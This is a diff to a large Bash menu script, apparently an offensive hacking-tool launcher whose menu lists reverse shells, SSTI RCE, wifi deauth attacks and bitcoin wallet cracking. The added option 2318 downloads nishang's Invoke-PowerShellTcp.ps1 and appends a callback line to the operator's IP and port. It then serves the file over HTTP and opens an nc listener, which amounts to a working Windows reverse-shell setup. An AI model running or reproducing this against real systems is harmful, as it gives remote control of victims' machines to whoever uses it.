@@ -844,7 +844,7 @@ while true; do
 	echo -ne " 9. wifi WPA with deauth attack\t\t\t2251. SSTI RCE\t\t\t\t\t\t2252. SSTI jinja2 RevShell\n"
 	echo -ne " 76. print all functions of a binary\t\t135. dump all opcodes from a binary\n"
 	echo -ne " 2261. Encrypt and Encode a file to pass in remote host\t\t\t\t\t\t\t2267. install a python hacking package\n"
-	echo -ne " 2268. install a python3 hacking package\t2289. install a ruby hacking gem\n"
+	echo -ne " 2268. install a python3 hacking package\t2289. install a ruby hacking gem\t\t\t\tPrepare RevShell for Windows\n"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	echo -ne " 511. Isaacdelly/Plutus\t\t\t\t512. dan-v/bruteforce-bitcoin-brainwallet\t\t513. SMH17/bitcoin-hacking-tools\n"
@@ -9192,6 +9192,22 @@ while true; do
 	;;
 	"2317")
 		Clona "mdsecactivebreach/SharpShooter"
+	;;
+	"2318")
+		Scarica "$ENTRAW""samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"
+		echo "Digit your IP address"
+		read -p "(example, 192.168.1.10): " MIP
+		if [[ "$MIP" != "" ]];
+		then
+			echo "Digit your port"
+			read -p "(example, 9001): " MPRT
+			if [[ "$MPRT" =~ ^[0-9]+$ ]];
+			then
+				echo -ne "\nInvoke-PowerShellTcp -Reverse -IPAddress ""$MIP"" -Port ""$MPRT" >> Invoke-PowerShellTcp.ps1
+				python3 -m http.server &
+				rlwrap nc -lvnp "$MPRT"
+			fi
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
